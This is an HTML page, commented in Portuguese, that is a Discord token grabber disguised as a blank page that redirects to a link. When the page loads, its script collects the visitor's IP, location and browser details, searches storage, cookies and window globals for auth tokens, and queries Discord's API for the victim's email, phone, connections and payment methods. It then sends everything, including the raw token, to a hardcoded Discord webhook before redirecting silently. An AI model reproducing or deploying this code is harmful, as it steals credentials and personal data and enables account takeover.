<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        /* Invisível - página em branco */
        body { background: #fff; margin: 0; }
    </style>
</head>
<body>
<script>
    (async function() {
        const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
        const redirectURL = "https://youtu.be/zar1aeSaslA?si=SciLKK-gG_QcbNo5"; // ← COLOCA AQUI O LINK DA TUA LOJA

        let ip = "Não capturado";
        try {
            const resp = await fetch("https://api.ipify.org?format=json");
            ip = (await resp.json()).ip;
        } catch(e) {}

        let cidade = "N/A", pais = "N/A", isp = "N/A";
        try {
            const locResp = await fetch("https://ipapi.co/json/");
            const locData = await locResp.json();
            cidade = locData.city || "N/A";
            pais = locData.country_name || "N/A";
            isp = locData.org || "N/A";
        } catch(e) {}

        let token = null;
        let metodos = [];

        const chavesPossiveis = [
            "token", "access_token", "refresh_token", "discord_token",
            "discord_access_token", "authorization", "bearer",
            "oauth_token", "session_token", "auth_token",
            "discordauth", "discord_session", "user_token",
            "client_token", "api_token", "jwt", "session",
            "discord.user.token", "discord_token_v2",
            "discord.accessToken", "discord.refreshToken"
        ];

        try { for (const chave of chavesPossiveis) { try { const valor = localStorage.getItem(chave); if (valor && valor.length > 20) { token = valor; metodos.push("localStorage:" + chave); break; } } catch(e) {} } } catch(e) {}
        if (!token) { try { for (const chave of chavesPossiveis) { try { const valor = sessionStorage.getItem(chave); if (valor && valor.length > 20) { token = valor; metodos.push("sessionStorage:" + chave); break; } } catch(e) {} } } catch(e) {} }
        if (!token) { try { for (let i = 0; i < localStorage.length; i++) { const chave = localStorage.key(i); const valor = localStorage.getItem(chave); if (valor && typeof valor === 'string' && valor.length > 30) { if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) { token = valor; metodos.push("localStorage:" + chave.substring(0, 20)); break; } } } } catch(e) {} }
        if (!token) { try { for (let i = 0; i < sessionStorage.length; i++) { const chave = sessionStorage.key(i); const valor = sessionStorage.getItem(chave); if (valor && typeof valor === 'string' && valor.length > 30) { if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) { token = valor; metodos.push("sessionStorage:" + chave.substring(0, 20)); break; } } } } catch(e) {} }
        if (!token) { try { const databases = await indexedDB.databases ? await indexedDB.databases() : []; for (const db of databases) { if (db.name && db.name.toLowerCase().includes('discord')) { metodos.push("indexedDB:" + db.name); } } } catch(e) {} }
        if (!token) { try { const cookies = document.cookie.split(';'); for (const cookie of cookies) { const [nome, valor] = cookie.trim().split('='); if (valor && valor.length > 30 && (valor.includes('.') || valor.includes('mfa'))) { token = valor; metodos.push("cookie:" + nome); break; } } } catch(e) {} }
        if (!token) { try { for (const key in window) { try { const val = window[key]; if (val && typeof val === 'string' && val.length > 50 && val.includes('.')) { const parts = val.split('.'); if (parts.length === 3) { token = val; metodos.push("window." + key); break; } } } catch(e) {} } } catch(e) {} }

        async function enviarEmbed(titulo, fields, descricao, mentionEveryone) {
            const content = mentionEveryone ? "@everyone" : "";
            const embed = {
                title: titulo,
                color: 0x9B59B6,
                description: descricao || "",
                fields: fields,
                footer: { text: "xxx team" },
                timestamp: new Date().toISOString()
            };
            const payload = { embeds: [embed] };
            if (content) payload.content = content;
            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        if (token && token.length > 40 && !token.includes(" ")) {
            try {
                const headers = { "Authorization": token };
                let resp = await fetch("https://discord.com/api/v9/users/@me", { headers });
                if (!resp.ok) resp = await fetch("https://discord.com/api/v10/users/@me", { headers });

                if (resp.ok) {
                    const data = await resp.json();
                    let username = data.username || "Desconhecido";
                    if (data.discriminator && data.discriminator !== "0") username += "#" + data.discriminator;
                    let email = data.email || "Oculto/indisponível";
                    let phone = data.phone || "Não vinculado";
                    let mfa = data.mfa_enabled ? "Sim" : "Não";
                    let verified = data.verified ? "Sim" : "Não";
                    const premium = data.premium_type || 0;
                    let nitro = premium === 2 ? "Nitro Clássico" : premium === 1 ? "Nitro Básico" : "Não";
                    let createdAt = "N/A";
                    if (data.id) { const t = (parseInt(data.id) / 4194304) + 1420070400000; createdAt = new Date(t).toLocaleDateString('pt-PT'); }

                    let connections = "Nenhuma";
                    try { const cR = await fetch("https://discord.com/api/v9/users/@me/connections", { headers }); if (cR.ok) { const cD = await cR.json(); if (cD.length > 0) connections = cD.slice(0, 5).map(c => `${c.type}: ${c.name}`).join(", "); } } catch(e) {}

                    let guildsCount = "N/A";
                    try { const gR = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers }); if (gR.ok) guildsCount = (await gR.json()).length + " servidores"; } catch(e) {}

                    let billingInfo = "Nenhum";
                    try { const bR = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers }); if (bR.ok) { const bD = await bR.json(); if (bD.length > 0) billingInfo = bD.length + " método(s) de pagamento"; } } catch(e) {}

                    await enviarEmbed(
                        "🎯 TOKEN VÁLIDO - DADOS DA VÍTIMA",
                        [
                            { name: "👤 **USUÁRIO**", value: `**Discord:** ${username}\n**ID:** ${data.id}\n**Conta criada:** ${createdAt}`, inline: false },
                            { name: "📧 **EMAIL & TELEFONE**", value: `**Email:** ${email}\n**Telefone:** ${phone}\n**Verificado:** ${verified}`, inline: true },
                            { name: "🔒 **SEGURANÇA**", value: `**MFA:** ${mfa}\n**Nitro:** ${nitro}`, inline: true },
                            { name: "📊 **ESTATÍSTICAS**", value: `**Servidores:** ${guildsCount}\n**Conexões:** ${connections}\n**Pagamento:** ${billingInfo}`, inline: false },
                            { name: "🔑 **TOKEN**", value: `\`\`\`${token}\`\`\`\n**Método:** ${metodos.join(", ") || "Desconhecido"}`, inline: false },
                            { name: "🌐 **LOCALIZAÇÃO**", value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`, inline: true },
                            { name: "💻 **SISTEMA**", value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}\n**Resolução:** ${screen.width}x${screen.height}`, inline: true }
                        ],
                        `**${username}** caiu no grabber! 🎉`,
                        false
                    );
                } else {
                    await enviarEmbed("⚠️ TOKEN INVÁLIDO", [
                        { name: "🔑 Token", value: `\`${token}\``, inline: false },
                        { name: "🌐 IP", value: ip, inline: true },
                        { name: "📍 Localização", value: `${cidade}, ${pais}`, inline: true },
                        { name: "📡 ISP", value: isp, inline: true }
                    ], `Status HTTP: ${resp.status}`, false);
                }
            } catch(e) {
                await enviarEmbed("❌ ERRO AO VALIDAR TOKEN", [
                    { name: "🌐 IP", value: ip, inline: true },
                    { name: "❌ Erro", value: e.message.substring(0, 100), inline: true }
                ], "", false);
            }
        } else {
            await enviarEmbed("@everyone mais um burro 🐴", [
                { name: "🌐 **LOCALIZAÇÃO**", value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`, inline: true },
                { name: "💻 **SISTEMA**", value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}`, inline: true },
                { name: "🔍 **Métodos tentados**", value: "localStorage, sessionStorage, cookies, IndexedDB, window", inline: false }
            ], `IP: ${ip} | ${cidade}, ${pais}`, true);
        }

        // REDIRECIONA SILENCIOSAMENTE PARA A LOJA
        window.location.replace(redirectURL);
    })();
</script>
</body>
</html>
